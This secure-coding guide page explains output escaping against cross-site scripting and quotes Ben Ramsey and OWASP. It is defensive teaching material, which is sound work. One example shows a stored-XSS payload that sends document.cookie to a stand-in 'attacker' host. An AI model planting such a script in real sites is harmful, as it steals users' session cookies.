# Escape Output

### One Paragraph Explainer

HTML and other web languages mix content with executable code - a single HTML paragraph might contain a visual representation of data along with JavaScript execution instructions. When rendering HTML or returning data from API, what we believe is a pure content might actually embody JavaScript code that will get interpreted and executed by the browser. This happens, for example, when we render content that was inserted by an attacker to a database - for example `<div><script>//malicious code</script></div>`. This can be mitigated by instructing the browser to treat any chunk of untrusted data as content only and never interpret it - this technique is called escaping. Many npm libraries and HTML templating engines provide escaping capabilities (example: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi)). Not only HTML content should be escaped but also CSS and JavaScript


### Code example - Don't put untrusted data into your HTML 

```html
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### Code example - Malicious content that might be injected into a DB

```html
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Blog Quote: "When we don’t want the characters to be interpreted"

From the Blog [benramsey.com](https://benramsey.com/articles/escape-output/)
> Data may leave your application in the form of HTML sent to a Web browser, SQL sent to a database, XML sent to an RSS reader, WML sent to a wireless device, etc. The possibilities are limitless. Each of these has its own set of special characters that are interpreted differently than the rest of the plain text received. Sometimes we want to send these special characters so that they are interpreted (HTML tags sent to a Web browser, for example), while other times (in the case of input from users or some other source), we don’t want the characters to be interpreted, so we need to escape them.
>
> Escaping is also sometimes referred to as encoding. In short, it is the process of representing data in a way that it will not be executed or interpreted. For example, HTML will render the following text in a Web browser as bold-faced text because the `<strong>` tags have special meaning:
>
> ```html
> <strong>This is bold text.</strong>
> ```
>
> But, suppose I want to render the tags in the browser and avoid their interpretation. Then, I need to escape the angle brackets, which have special meaning in HTML. The following illustrates the escaped HTML:
>
> ```html
> &lt;strong&gt;This is bold text.&lt;/strong&gt;
> ```

<br/><br/>

### Blog Quote: "OWASP recommends using a security-focused encoding library"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. **OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented**."


<br/><br/>

### Blog Quote: "You MUST use the escape syntax for the part of the HTML"

From the blog OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "But HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into."